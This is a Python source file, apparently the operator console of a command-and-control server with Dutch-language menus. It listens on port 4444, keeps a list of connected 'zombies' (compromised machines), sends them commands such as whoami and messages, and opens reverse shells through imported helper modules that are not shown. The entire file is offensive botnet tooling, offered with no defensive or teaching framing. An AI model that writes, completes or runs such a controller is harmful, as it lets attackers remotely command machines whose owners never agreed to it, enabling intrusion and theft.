
import socket
import threading
from modules.crypto import decrypt_message, get_key
from modules.commands import send_command, receive_response
from modules.reverse_shell import start_reverse_shell
from modules.logger import log_info, log_error

HOST = '0.0.0.0'
PORT = 4444
clients = []

def handle_client(conn, addr):
    log_info(f"Zombie verbonden: {addr}")
    clients.append((conn, addr))

def client_menu():
    if not clients:
        print("[!] Geen zombies verbonden.")
        return

    print("\nVerbonden zombies:")
    for i, (_, addr) in enumerate(clients):
        print(f"[{i}] {addr}")
    try:
        index = int(input("\nSelecteer zombie #: "))
        conn, addr = clients[index]
        interact_with_zombie(conn, addr)
    except:
        print("[!] Ongeldige selectie.")

def interact_with_zombie(conn, addr):
    while True:
        print(f"\n[+] Verbonden met zombie {addr}")
        print("1. Stuur bericht")
        print("2. Reverse shell")
        print("3. Whoami")
        print("4. Terug naar hoofdmenu")
        choice = input("Keuze: ").strip()

        if choice == "1":
            msg = input("Bericht: ")
            send_command(conn, msg)
        elif choice == "2":
            send_command(conn, ":shell:")
            start_reverse_shell(conn)
        elif choice == "3":
            send_command(conn, "whoami")
            response = receive_response(conn)
            print(f"[+] Antwoord: {response}")
        elif choice == "4":
            break
        else:
            print("[!] Ongeldige keuze.")

def start_server():
    print(f"[+] C2-server luistert op {HOST}:{PORT}")
    print(f"[🔑] Encryptiesleutel (delen met client): {get_key().decode()}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def main_menu():
    threading.Thread(target=start_server, daemon=True).start()
    while True:
        print("\n=== C2 FRAMEWORK MENU ===")
        print("1. Bekijk zombies")
        print("2. Stop server")
        choice = input("Keuze: ").strip()
        if choice == "1":
            client_menu()
        elif choice == "2":
            print("[*] Server wordt gestopt.")
            break

if __name__ == '__main__':
    main_menu()
